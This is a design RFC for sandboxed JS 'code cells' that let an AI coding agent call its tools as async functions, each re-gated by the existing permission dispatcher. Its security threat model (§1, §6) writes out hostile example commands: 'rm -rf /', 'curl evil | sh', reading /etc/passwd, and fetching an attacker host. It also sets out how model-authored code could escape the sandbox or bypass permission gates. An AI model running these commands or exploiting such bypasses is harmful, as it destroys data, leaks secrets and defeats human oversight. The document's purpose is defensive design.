# RFC — code_mode: JS-runtime tool-calling (`src/codemode/`)

> Status: PROPOSED (design only — no source changed by this RFC; deps proposed, not added)
> Date: 2026-06-06
> Slice: NEW `src/codemode/` + a single GATED tool + a thin binding hook in `@/agent`
> Default posture: OFF (byte-identical when `QUANTA_CODE_MODE` is unset — no new tool registered, no runtime instantiated)
> Feature axis: agent-loop mechanic (NEW) — the dispatch model itself, not a new tool
> Honesty note: this is the **highest-architecture** item on the jun-6 board. Section §8 is brutally honest about cost; §6 (security) is make-or-break.

---

## 1. 요약

Today quanta dispatches **one tool call per LLM round-trip**. The model emits a `tool_use` block; the loop runs `dispatchTool` (`src/agent/dispatch.ts:505`); the result goes back; the model emits the next block. A 6-step sequence (read 3 files, grep each, write a summary) costs **6 model turns** — 6 prompt re-sends, 6 latency round-trips, 6× the prompt-prefix tokens.

**code_mode** (verified in Codex 0.135 — `core/src/tools/code_mode/{mod,execute_handler,wait_handler}.rs`) inverts this: the model writes a **JS PROGRAM** (a "code cell") that calls tools as ordinary async functions — `const a = await tools.read({path}); for (const f of a.files) await tools.grep({...})`. The program runs in a **sandboxed JS runtime**; each `await tools.X(...)` inside it round-trips to the REAL `dispatchTool` (so permission/HARD_DENY/plan-mode still gate every call); loops/conditionals/fan-out happen **in one cell = one model turn**. Big token + latency savings on multi-step sequences.

This RFC proposes a NEW `src/codemode/` slice: a **QuickJS-WASM** sandbox, a **tool-binding shim** that marshals in-cell calls back through `dispatchTool` (the critical security invariant), a single GATED `code_cell` tool, and cell-lifecycle stream events. **Entirely default-OFF**: when `QUANTA_CODE_MODE` is unset, no runtime is instantiated, no tool is registered, and the loop is byte-identical to today.

**The #1 hazard, stated up front:** a code cell MUST NOT become a permission-bypass. If a tool call from inside the sandbox skips the admissibility gate, code_mode is a privilege-escalation vector (the model writes `await tools.bash({cmd:"rm -rf /"})` and it runs ungated). §6 is the make-or-break section; the binding (§4.2) routes EVERY in-cell call through the exact same `dispatchTool` chokepoint the loop uses — there is no second dispatch path.

---

## 2. 경쟁사 레퍼런스 (verified evidence)

### 2.1 Codex 0.135 — `code_mode` (verified, round-1 absorption audit)

Source: `core/src/tools/code_mode/{mod,execute_handler,wait_handler}.rs` + runtime asset `code_mode_exit__exec_main.mjs`. The shape:

- **Flags** (4): `code_mode`, `code_mode_only`, `js_repl`, `js_repl_tools_only`. `code_mode` = code-cells available alongside normal tool calls; `code_mode_only` = the model MUST use cells (normal tool_use suppressed); `js_repl*` = the REPL-flavoured variant. So the absorb target is a **gradient**, not a binary — Phase 1 maps to plain `code_mode` (additive, opt-in).
- **Runtime tool id** `code_mode_runtime_tool_id` — the cell's tool binding is itself a registered tool id, i.e. in-cell calls are not a side channel; they go through the same tool registry the normal loop uses. This is the precedent for our §4.2 invariant.
- **Events** `code_cell_started` / `dispatch_tool_call_with_terminal_outcome` — the runtime streams a **cell-start** event, then per in-cell tool call a **dispatch event carrying the terminal outcome** (success/deny/error). So the host SEES every in-cell dispatch as a first-class event (not opaque). We mirror this with `code_cell.started` / `code_cell.tool_call` / `code_cell.result` stream events (§4.3).
- **`exec_main.mjs`** — the runtime entry that wraps the model's program with the `tools.*` binding object + a `main()` harness, runs it, captures the return value/stdout, and exits. We mirror this as a generated wrapper module (§4.1).

**What it actually does (summary):** the model authors a small JS program; tool calls are local async function calls; the program runs once in a sandbox; the sandbox marshals each tool call back to the real dispatcher and streams start/per-call/result events. Loops and conditionals over tool results collapse a multi-turn sequence into one turn. This RFC adopts the **mechanic** verbatim in spirit, with quanta's harness-forced security posture bolted on (every in-cell call re-enters `dispatchTool`).

### 2.2 Why this is genuinely new (not a re-skin of what we have)

The prompt flagged two near-neighbours; both are confirmed DIFFERENT:

- **`streaming-dispatch.ts`** (`src/agent/streaming-dispatch.ts`) runs **parallel** tool calls as they finish streaming — but each is still a `tool_use` block the MODEL emitted, one model turn produces the batch, and there is no loop/conditional/data-flow BETWEEN calls (the model can't say "grep each file the read returned" without a second turn). code_mode adds **in-program control flow over tool results** — the model expresses the data-flow once, in code. Parallel ≠ code-as-dispatch.
- **`bash` tool** (`src/tool/bash/`) runs a shell command — but bash is itself ONE gated tool call, and a shell command cannot call quanta's `read`/`grep`/`edit` tools (it shells out to the OS, bypassing the tool layer entirely). code_mode's cell calls the *quanta tool surface* as functions, each re-gated. bash ≠ tool-as-code.

---

## 3. 현재 quanta 상태 (grep-verified) — ABSENCE confirmed

### 3.1 No code-as-dispatch mechanism exists

- `grep -rniE "code_mode|js_repl|code\.cell|codeMode|code_cell|tools.as.code|code-mode" src/ --include="*.ts"` → **the only hit is `src/agent/repro-test/select.ts`, and that hit is the substring `code_mode` inside an unrelated identifier — confirmed NOT a code-mode mechanism** (it is the repro-test selector). No code-cell, no JS-runtime tool binding anywhere.
- `grep -rniE "quickjs|isolated-vm|vm2|vm\.runInContext|new Function\(" src/ --include="*.ts"` over non-test files → matches are all the literal strings `--eval`/`eval` inside unrelated prose/argv handling (`src/host/runtime/agent-args.ts`, `src/runner/knobs/types.ts`, etc.), NOT a JS sandbox. quanta has **no embedded JS interpreter**.
- `package.json` dependencies: `@anthropic-ai/*`, `openai`, `yaml`, `zod` only. **No QuickJS, no isolated-vm, no vm2.** A sandbox runtime is a NEW dep (proposed in §4.1, not added by this RFC).

### 3.2 The dispatch model today is strictly one-tool-call-per-LLM-turn

- `dispatchTool` (`src/agent/dispatch.ts:505`) is the loop's single-tool chokepoint: `(call: ToolUseBlock, config, permission, onProgress?, autoClassifier?, workingState?) → Promise<DispatchResult>`. It opens the `handleToolCall` span, runs `dispatchToolInner` → `runAdmissibilityGate` (`:903`) → the tool's `execute`. It has a documented **NO-THROW CONTRACT** (`:547`) — every failure becomes an `ok:false` tool_result.
- `streaming-dispatch.ts` overlaps dispatches in time but the call list comes from `tool_use` blocks the model emitted (§2.2). There is no path where quanta-internal code synthesizes a `ToolUseBlock` and feeds it to `dispatchTool` in a loop **driven by a model-authored program**. That is exactly the gap code_mode fills.

**Conclusion: ABSENT. This is a genuine new agent-loop mechanic, not present in any form.**

### 3.3 The chokepoint we will reuse (do NOT re-roll)

`dispatchTool` is the single security funnel. EVERY existing dispatch (loop + streaming) goes through it; it runs the admissibility gate, permission, plan-mode block, HARD_DENY, dedup, secret redaction (`redactSecrets` from `@/security`, `src/security/index.ts:12`). The binding (§4.2) MUST call this exact function with a synthesized `ToolUseBlock` and the SAME `config`/`permission`/`autoClassifier` the loop holds — that is the whole security argument. We add NO second dispatch path.

---

## 4. 설계

### 4.1 The sandboxed JS runtime decision (the key call)

| Option | Sandbox strength | Native dep / build cost | Determinism | Verdict |
|---|---|---|---|---|
| **QuickJS via `quickjs-emscripten`** (WASM) | True isolate — separate heap, NO host globals, NO `require`/`fetch`/`process`/FS unless we inject them | **Pure WASM, no native build, no node-gyp** — portable to every quanta surface (CLI, Bun, web-daemon) | Deterministic, configurable interrupt + memory cap | **RECOMMENDED** |
| `isolated-vm` | Strongest (V8 isolate) | **Native node-gyp build** — breaks Bun portability, build cost on every platform, has had Node-version churn | Good | Rejected — native build cost violates quanta portability (§8) |
| Bun's own `vm`/worker | Weak — `vm` is NOT a security boundary; a `Worker` shares too much | Zero | n/a | Rejected — `vm` is explicitly not a sandbox; trivial escape |
| Deno subprocess | Strong (OS-level perms) | New runtime dependency + IPC + process mgmt | OK but heavy | Rejected — too heavy for a per-cell call; we already have Bun |

**RECOMMEND: `quickjs-emscripten` (QuickJS compiled to WASM).** Justification:

1. **True sandbox with no escape surface.** QuickJS runs in its own WASM heap. The cell's global object has ONLY what we put on it. There is no `require`, no `fetch`, no `process`, no `Bun`, no `globalThis` host bridge unless we explicitly marshal a function across the boundary. The cell physically cannot reach the host FS/network — the WASM module has no syscall surface (§6).
2. **No native dependency.** Pure WASM — no node-gyp, no per-platform build, works identically under Bun on every quanta surface. This is the decisive factor: `isolated-vm`'s native build would break the `bun build --compile` single-binary story (`package.json:39`).
3. **Hard resource limits, built in.** `quickjs-emscripten` exposes `setMemoryLimit(bytes)` and a `shouldInterrupt` callback (deadline-based interrupt) — exactly the memory + CPU-time caps we need (§4.4). A runaway `while(true){}` cell is interrupted deterministically.
4. **Async marshalling is supported.** The newer `quickjs-emscripten` async variant (`newAsyncRuntimeFromVariant`) supports an `async` host function bridge — required because each `await tools.X(...)` must await a real async `dispatchTool` on the host side (§4.2). (The sync variant cannot await host promises; we need the async build.)

**Cost honesty:** this adds ONE new dependency (`quickjs-emscripten`, ~MB-scale WASM blob). It is the only realistic "true sandbox + no native build" option in the JS ecosystem. §8 covers the WASM-size + async-bridge-complexity costs.

### 4.2 Tool→JS binding (the critical security marshalling)

Each quanta tool is exposed inside the cell as an async function on a `tools` object:

```js
// inside the cell (model-authored), pseudo:
const dir = await tools.glob({ pattern: "src/**/*.ts" })
for (const path of dir.paths) {
  const text = await tools.read({ path })
  if (text.includes("TODO")) await tools.grep({ pattern: "TODO", path })
}
return { scanned: dir.paths.length }
```

The binding marshals **every** `tools.X(args)` back across the WASM boundary to the host, where it becomes a synthesized `ToolUseBlock` fed to the REAL `dispatchTool`:

```
cell calls tools.read({path})
  → QuickJS async host-function bridge resolves on the host with (name="read", input={path})
  → host builds ToolUseBlock { id: "cell_<cellId>_<seq>", name: "read", input: {path} }
  → host calls dispatchTool(block, config, permission, onProgress, autoClassifier, workingState)
         ↑ THE SAME config/permission/autoClassifier the loop holds — no copy, no relaxation
  → dispatchTool runs admissibility gate / permission / plan-mode / HARD_DENY / redaction (unchanged)
  → DispatchResult comes back; host marshals the tool_result CONTENT (text/json) into the cell as the
    resolved value (or THROWS a typed JS error into the cell on a non-ok / denied result — §4.5)
  → cell's `await` resolves/rejects; control flow continues IN the cell
```

**Security invariants of the binding (each is a hellgate case, §7):**

- **No bypass.** There is exactly ONE function the binding may call: `dispatchTool` (`src/agent/dispatch.ts:505`). It does NOT call a tool's `execute` directly, does NOT call the registry directly, does NOT construct its own permission context. The `config`/`permission`/`autoClassifier`/`workingState` passed are the loop's live objects (the binding is constructed by an `@/agent`-side factory that closes over them — the cell tool's `execute` receives them via `ToolContext`). So a code cell is, security-wise, indistinguishable from N normal tool calls.
- **Surface = the normal tool menu.** The `tools.*` object is built from the SAME tool set the loop exposes for the current surface/mode (filtered through the existing surface manifest + plan-mode mutating-block). A tool the model can't call normally is NOT on the cell's `tools` object. The cell can't widen its own surface.
- **Args are validated by the tool's own schema** inside `dispatchTool` (unchanged) — the cell can pass garbage; the tool rejects it as it would a normal call.
- **Plan-mode mutating block still fires.** A cell in plan mode calling `tools.edit(...)` hits the SAME dispatch-seam `plan` block (`dispatch.ts` mode resolution) → denied → typed throw into the cell. No bypass.
- **HARD_DENY still fires.** A cell calling a HARD_DENY'd command → admissibility gate denies → typed throw into the cell. The cell can `try/catch` it, but it CANNOT make the call succeed.

### 4.3 Cell lifecycle + stream events

- **`code_cell` tool** (GATED, single new tool). Input: `{ code: string, timeoutMs?: number }`. The model emits a normal `tool_use` for `code_cell` with the program as `code`. The tool's `execute` instantiates a QuickJS runtime, installs the `tools` binding (§4.2), wraps `code` in the `exec_main` harness, runs it, and returns a typed `ToolResult` (the program's return value, JSON-stringified + capped, plus a per-call ledger).
- **Stream events** (mirroring Codex `code_cell_started` / `dispatch_tool_call_with_terminal_outcome`), emitted on the existing effect/event channel:
  - `code_cell.started { cellId, codeBytes }`
  - `code_cell.tool_call { cellId, seq, tool, outcome: "ok"|"denied"|"error" }` — one per in-cell dispatch, carrying the TERMINAL outcome (never the tool input — categorical only, §6).
  - `code_cell.result { cellId, toolCalls, durationMs, status: "ok"|"timeout"|"error"|"cap" }`
- **Per-cell ledger.** The `code_cell` result includes a structured summary: `{ toolCalls: [{tool, outcome}], returned: <capped JSON>, durationMs }` so the model sees what happened across the whole cell in ONE result block — the token win is real here too (one result vs N).

### 4.4 Limits: memory, time, output, abort

- **Memory:** `runtime.setMemoryLimit(QUANTA_CODE_MODE_MEM_BYTES ?? 64 MiB)`. WASM-enforced; an over-allocating cell throws inside QuickJS → typed cap result.
- **CPU time:** `shouldInterrupt` deadline = `timeoutMs ?? QUANTA_CODE_MODE_TIMEOUT_MS ?? 30_000`. A `while(true){}` is interrupted deterministically → `status:"timeout"`.
- **Tool-call count:** `QUANTA_CODE_MODE_MAX_CALLS ?? 64` per cell — a runaway fan-out loop is capped (the binding counts dispatches; over-cap → typed throw into the cell + `status:"cap"`). Prevents a cell from issuing 10⁶ dispatches.
- **Abort:** the cell tool's `execute` receives the loop's `AbortSignal` (existing `ToolContext` plumbing). On abort, `shouldInterrupt` returns true immediately and the runtime is disposed — no orphaned WASM heap.
- **Output cap:** the program's return value + any captured `console.log` is JSON-stringified and capped (`QUANTA_CODE_MODE_OUTPUT_CAP ?? 16 KiB`, mirroring the bash/test_runner 4 KB-class caps) with a `[truncated]` marker. No unbounded result.

### 4.5 Error surfacing (throwing cell → typed result)

- A tool call that returns `ok:false` (deny / tool error) is marshalled into the cell as a **thrown JS error** with a typed shape `{ name:"ToolDenied"|"ToolError", tool, reason }` (categorical reason only — §6). The cell MAY `try/catch` it (that's the point — the model can branch on a failure), but a caught deny does NOT make the underlying action happen.
- A program that throws uncaught → the cell result is `{ status:"error", error: <message, redacted+capped> }` — never a host stack trace (a QuickJS error stack is cell-internal; we surface only the message).
- A syntax-error program → `status:"error"` at parse time, before any dispatch. No partial side effects from an unparseable cell.

---

## 5. 통합

### 5.1 Slice placement + fence

- New slice `src/codemode/` holds the **pure** runtime concern: QuickJS instantiation, the `exec_main` wrapper generation, limits, output capping, and the binding *interface* (`CodeCellDispatchPort` — a closed port `(name, input) => Promise<DispatchOutcome>`). `@/codemode` imports ONLY `node:*` / the WASM dep / `@/shared` (runtime-config) / `@/security` (redaction of cell output). It imports NO `@/agent`, `@/permission`, `@/tool` — it does NOT know about `dispatchTool`; it only knows it has a port to call.
- The **binding to the real dispatcher** lives in `@/agent` (`src/agent/codemode-wire.ts`): an `@/agent`-side factory builds the `CodeCellDispatchPort` by closing over the loop's `config`/`permission`/`autoClassifier`/`workingState` and routing each call to `dispatchTool`. This keeps the security-critical wiring in `@/agent` (the only slice allowed to touch both `@/permission` and the dispatcher) and keeps `src/codemode/` a dumb sandbox that CANNOT reach the dispatcher except via the injected port. Inversion-of-control IS the security boundary.
- The `code_cell` **tool** lives in `src/tool/codemode-tool.ts` (per the existing `@/tool` fence: it imports `@/codemode` + receives the dispatch port via `ToolContext`). To let `@/tool` import `@/codemode`, add `@/codemode` to the `@/tool`-reachable allowlist (alongside `@/storage`/`@/runtime`/`@/shared`) and to the global restricted-paths block for every other library slice (mirroring the `@/security` entry at `biome.json:75`). An arch-scan ratchet pins `src/codemode/**` to `node:* | @/shared | @/security | <wasm dep>` only.

### 5.2 Config knob (default-OFF, byte-identical)

- Add `codeMode: boolean` to `RuntimeConfig`, parsed `env["QUANTA_CODE_MODE"] === "1"` (strict, mirroring `imageGen`/`artifactStore`). Default `false`.
- Knobs: `QUANTA_CODE_MODE_MEM_BYTES`, `QUANTA_CODE_MODE_TIMEOUT_MS`, `QUANTA_CODE_MODE_MAX_CALLS`, `QUANTA_CODE_MODE_OUTPUT_CAP` (§4.4 defaults).
- **OFF ⇒** composition root wires no `CodeCellDispatchPort`; the `code_cell` tool is NOT registered (not in `buildDefaultTools`); the QuickJS WASM module is **never instantiated** (lazy-loaded only when the tool runs). The default tool menu, the loop, and every existing tool are **byte-identical** — proven by the tool-surface drift guard + a "no QuickJS instantiated when off" hellgate.

### 5.3 Tool-surface manifest

Add ONE GATED entry to `src/tool/surface/manifest.ts` (shape per `:139`):

```
code_cell  gate:{kind:"config-slot", slot:"codeMode", env:"QUANTA_CODE_MODE"}  default:{}  risk:"exec"
```

`risk:"exec"` (it runs model-authored code, even if sandboxed + each tool call re-gated — it is at least as powerful as the union of the tools it can call). `default:{}` (opt-in on every surface) — never auto-seeded. The `code_mode_only` Codex variant (suppress normal tool_use) is **deferred** (Phase 3, §7) — Phase 1/2 are purely additive.

### 5.4 Feature-catalog entry

Add `tools/feature-catalog/features/03-agent-loop/code-mode.yaml`: `subsystem: code_mode (JS-runtime tool-calling)`, `maturity: L2` (seam) → `L3` once wired, `labels:[surface:cli, category:agent-loop, default-off]`, `depends_on:[dispatch, streaming-dispatch]` (it composes the dispatcher), `config_refs.env:[QUANTA_CODE_MODE, ...]`, evidence.code listing the new slice + the wire + the tool + manifest.

---

## 6. 보안 (make-or-break)

This is the section that decides whether code_mode ships. Three threat classes:

### 6.1 Permission bypass (#1 hazard — the whole ballgame)

**Threat:** the model writes `await tools.bash({cmd:"curl evil | sh"})` inside a cell and it runs WITHOUT the admissibility gate / HARD_DENY / plan-mode block.

**Mitigation (structural, not a check):** there is exactly ONE dispatch path. The binding (§4.2) calls `dispatchTool` — the SAME function the loop calls — with the SAME live `permission`/`config`/`autoClassifier`. There is no second code path that runs a tool. `src/codemode/` (the sandbox) literally cannot reach `dispatchTool` — it only holds an injected `CodeCellDispatchPort`, and the only implementation of that port (in `@/agent/codemode-wire.ts`) routes to `dispatchTool`. A cell is, to the permission system, N ordinary tool calls. **Hellgate:** a cell that loops calling a HARD_DENY'd tool → every iteration denied, zero side effects, the cell can catch the throw but cannot make it succeed; assert the admissibility gate fired once per in-cell call (call count == iteration count).

### 6.2 Sandbox escape (the cell touches FS/network directly)

**Threat:** the model writes `require('fs').readFileSync('/etc/passwd')` or `fetch('http://evil')` inside the cell, bypassing the tool layer entirely.

**Mitigation (structural):** QuickJS-WASM has NO `require`, NO `fetch`, NO `process`, NO `Bun`, NO FS/network syscall surface. The cell's global object contains ONLY the `tools` binding + a capped `console`. The WASM module physically cannot make a host syscall — there is no bridge for it unless we marshal one, and we marshal ONLY the `tools` dispatch bridge. **Hellgate:** a cell containing `require('fs')` / `fetch(...)` / `process.exit()` / `globalThis.Bun` → each is `undefined`/throws `ReferenceError` inside the cell → `status:"error"`, ZERO host FS/network touched (assert no host syscall via a spy on the FS port).

### 6.3 Output exfiltration / secret leak

**Threat:** a cell's return value or `console.log` leaks a secret (an env var marshalled in, a tool result containing a token) into the transcript.

**Mitigation:** (a) NO host env is marshalled into the cell — `process.env` is `undefined` inside QuickJS; the cell can only see what tool results return. (b) The cell's output (return value + captured console) passes through `redactSecrets` (`@/security`, `src/security/index.ts:12`) before becoming a `ToolResult` — the SAME redaction the normal dispatch result gets. (c) The per-call `code_cell.tool_call` events carry CATEGORICAL data only (tool name + outcome enum — never tool input, never result bytes), mirroring the existing dispatch-event no-leak discipline. **Hellgate:** a cell that returns a string containing a fake-token pattern → the `ToolResult` is redacted; the stream events carry no input/output bytes.

### 6.4 Resource exhaustion (DoS)

Covered by §4.4 — memory cap (WASM-enforced), CPU deadline (interrupt), tool-call count cap, output cap, abort. **Hellgate:** `while(true){}` → timeout; `new Array(1e9)` → memory cap; a 10⁶-iteration dispatch loop → call-count cap; all three produce a typed capped result, never hang the loop.

---

## 7. 테스트 / 헬게이트

### 7.1 Hellgate (adversarial) — `tests/unit/code-mode-hellgate.test.ts`

- **3 tools in a loop → 3 gated dispatches, 1 model turn.** A cell `for (const p of ["a","b","c"]) await tools.read({path:p})` → assert `dispatchTool` (spied) called exactly 3×, each through the admissibility gate, and the loop consumed ONE `code_cell` tool_use (one model turn). The core ROI proof.
- **In-cell HARD_DENY → blocked, no bypass** (§6.1). Cell calls a HARD_DENY'd tool in a loop → every call denied, the gate fired N times, the cell's `catch` saw a typed `ToolDenied`, ZERO side effects.
- **In-cell plan-mode mutating block → denied.** Cell in plan mode calls `tools.edit(...)` → same dispatch-seam plan block → typed throw, no write.
- **Sandbox escape denied** (§6.2). Cell with `require('fs')` / `fetch` / `process` / `Bun` / `globalThis` host reach → all `undefined`/throw, zero host syscall (FS-port spy asserts no touch).
- **Timeout / memory / call-count / abort** (§6.4) → each a typed capped result, never a hang; abort disposes the runtime (no orphan heap).
- **Output cap + redaction** (§6.3) → over-cap return truncated; secret-pattern return redacted; events carry no input/output bytes.
- **Throwing cell → typed result** (§4.5) → uncaught throw → `status:"error"` with redacted message, no host stack; syntax error → parse-time error, zero dispatch.
- **Default-OFF byte-identical** → with `QUANTA_CODE_MODE` unset: `code_cell` NOT in the tool menu (drift guard), QuickJS WASM never instantiated (spy on the lazy loader), the loop's `DispatchResult` for any normal call is identical.

### 7.2 E2E — `tests/unit/code-mode-e2e-hellgate.test.ts`

A stub-provider turn emits a `code_cell` whose program reads a fixture file, branches on its content, and writes a summary via `tools.write` → assert: one model turn, the read+write both passed `dispatchTool`, the write respected the FS jail, the cell result carried the per-call ledger. Mirrors `image-gen-e2e-hellgate.test.ts`.

---

## 8. 단계 + 비용 (HONEST — biggest item on the board)

**This is a multi-PR slice. Do not attempt it in one PR.** Honest cost assessment:

- **Phase 1 — runtime + binding + 1–2 tools, default-OFF.** `src/codemode/{runtime,exec-main,limits,types,index}.ts` (QuickJS instantiation via `quickjs-emscripten`, `exec_main` wrapper, mem/time/call/output caps, `CodeCellDispatchPort` interface, output redaction). `src/agent/codemode-wire.ts` (the binding factory → `dispatchTool`). `src/tool/codemode-tool.ts` (`code_cell`, gated). Wire the port into ONLY `read`+`grep`+`write` (a 3-tool surface) to prove the mechanic + the security invariants. Runtime-config knob, biome fence + arch-scan ratchet, manifest entry, hellgate §7.1, feature-catalog yaml. **This is where the hard part lives** (the async WASM bridge + the binding security proof). Ship + harden in isolation.
- **Phase 2 — full tool surface + events.** Expose the WHOLE current-surface tool menu on the cell's `tools` object (driven by the same surface manifest the loop uses). Wire the `code_cell.started` / `code_cell.tool_call` / `code_cell.result` stream events (§4.3). E2E §7.2. Tune caps.
- **Phase 3 (deferred, optional) — `code_mode_only`.** The Codex variant that SUPPRESSES normal `tool_use` and forces the model to use cells. Higher-risk (changes the loop's tool-choice contract); only if Phase 1/2 prove a real token/latency win on the smoke battery.

**Honest costs:**

1. **New dependency.** `quickjs-emscripten` — a WASM blob (MB-scale) added to the bundle even when code_mode is OFF (unless lazy-imported, which §5.2 mandates — the import is dynamic so the OFF binary never pays it). The single-binary `bun build --compile` may grow; verify the lazy-import keeps it out of the cold path.
2. **The async WASM bridge is genuinely fiddly.** Marshalling JS values across the WASM boundary (especially awaiting a host promise inside QuickJS, and converting tool results / errors both directions) is the hard engineering. `quickjs-emscripten`'s async variant supports it but the value-marshalling (handles, disposal, no leaks) requires care — every `QuickJSHandle` must be disposed or the WASM heap leaks. This is the bulk of Phase 1 effort.
3. **Security review is mandatory, not optional.** §6 is the make-or-break. Permission-bypass (§6.1) is a privilege-escalation vector if the binding is wrong. This slice should NOT land without an adversarial review confirming the single-dispatch-path invariant holds under every in-cell construct (recursion, async races, Promise.all fan-out — each in-cell concurrent call must still individually re-gate).
4. **ROI is conditional, not guaranteed.** The token/latency win is real ONLY for multi-step sequences with data-flow between calls. For single-tool turns it is pure overhead (instantiate a WASM runtime to make one call). The model also has to be GOOD at writing correct cell programs — a buggy cell wastes a turn worse than N clean tool calls. Recommend measuring on the smoke battery (multi-step tikitaka fixtures) before promoting past default-OFF. Default-OFF is the honest posture: ship the seam, measure, then decide.

**Recommendation:** worth building as a default-OFF seam because it is the one genuinely-new agent-loop mechanic on the board and the token/latency ceiling on multi-step work is real — but it is the **most expensive** item (multi-PR, new WASM dep, mandatory security review) and the ROI must be measured, not assumed. Do NOT gate other jun-6 items behind it.

---

## 9. 리스크 / 대안 / 비결정

- **QuickJS vs isolated-vm (decided — QuickJS, §4.1).** isolated-vm is a stronger isolate but its native node-gyp build breaks the `bun build --compile` single-binary portability that quanta depends on across CLI/web-daemon surfaces. QuickJS-WASM trades a hair of raw isolate strength for zero native dep + true sandbox + deterministic limits. **Revisit only if** a WASM-specific escape CVE emerges or the value-marshalling proves intractable.
- **Async bridge complexity (the real risk, §8.2).** If the async WASM marshalling proves too leak-prone, a fallback is a SYNC binding where in-cell tool calls are NOT awaited individually but BATCHED — the cell declares its calls, returns a plan, and the host runs them. This loses the "branch on a tool result mid-cell" power (the whole point) — so it is a last resort, not a design. Lead with the async bridge.
- **`code_mode_only` deferred (§7, Phase 3).** Forcing cells changes the tool-choice contract and could regress models that aren't good at cell authoring. Additive `code_mode` first; measure; only force if it wins.
- **Permission-bypass is the bet-the-feature risk (§6.1).** The mitigation is structural (single dispatch path), not a runtime check — which is the right kind of mitigation, but it MUST be proven by the §7.1 hellgate (call-count == iteration-count, gate fired per call) and an adversarial review. If the review can't prove no-bypass under in-cell `Promise.all` concurrency, the feature does not ship.
- **ROI conditional (§8.4).** Default-OFF; measure on smoke before promotion. n=1 anecdotes do not justify forcing it on (per the no-heuristics discipline).

---

## 10. 코드 위치 요약

**Create:**
- `src/codemode/types.ts` — `CodeCellDispatchPort` (`(name, input) => Promise<DispatchOutcome>`), `CodeCellResult`, `CodeCellLimits`, `CodeModeError`.
- `src/codemode/runtime.ts` — QuickJS-WASM instantiation (lazy `quickjs-emscripten` import), the `tools` binding installer, the async host-function bridge, handle disposal.
- `src/codemode/exec-main.ts` — generates the `main()` wrapper around the model's program (mirrors Codex `exec_main.mjs`).
- `src/codemode/limits.ts` — mem/time/call/output caps + abort wiring.
- `src/codemode/index.ts` — barrel.
- `src/agent/codemode-wire.ts` — the `@/agent`-side factory: builds `CodeCellDispatchPort` closing over the loop's `config`/`permission`/`autoClassifier`/`workingState` → routes each call to `dispatchTool`. THE security boundary.
- `src/tool/codemode-tool.ts` — the gated `code_cell` tool.
- `tools/feature-catalog/features/03-agent-loop/code-mode.yaml`.
- `tests/unit/code-mode-hellgate.test.ts`, `tests/unit/code-mode-e2e-hellgate.test.ts`.

**Touch:**
- `package.json` — add `quickjs-emscripten` (Phase 1; lazy-imported so OFF binary unaffected).
- `src/shared/runtime-config.ts` — add `codeMode` + the 4 cap knobs (+ env parse).
- `biome.json` — `@/codemode` in the `@/tool`-reachable allowlist + global restricted-paths for other slices; arch-scan ratchet pinning `src/codemode/**` imports.
- `src/tool/surface/manifest.ts` — 1 GATED `code_cell` entry + drift-guard update.
- `src/tool/index.ts` (Phase 1) — `DefaultToolPorts.codeCellDispatch?` + gated `code_cell` registration; wire the port from composition.
- `src/agent/loop.ts` / composition root (Phase 1) — build the `CodeCellDispatchPort` via `codemode-wire.ts` and thread it onto the `code_cell` tool's `ToolContext` when the knob is on.
